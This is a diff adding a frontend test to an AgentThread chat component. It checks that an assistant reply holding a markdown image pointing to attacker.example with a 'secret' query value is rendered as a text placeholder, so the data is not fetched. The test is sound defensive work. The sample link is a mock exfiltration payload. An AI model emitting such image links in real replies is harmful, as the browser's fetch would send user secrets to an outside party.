@@ -246,4 +246,24 @@ describe("AgentThread", () => {
       )
     ).toBeTruthy();
   });
+
+  it("names an image in the reply instead of loading it from its address", async () => {
+    const { container } = renderThread([
+      {
+        role: "assistant",
+        content: [
+          {
+            type: "text",
+            text: "Done. ![status](https://attacker.example/p.png?d=secret)",
+          },
+        ],
+      },
+    ]);
+
+    expect(await screen.findByText(/Done\./)).toBeTruthy();
+    // A browser fetches an <img> on render, so the address alone would carry
+    // whatever the model put in it to another origin.
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("[image: status]")).toBeTruthy();
+  });
 });
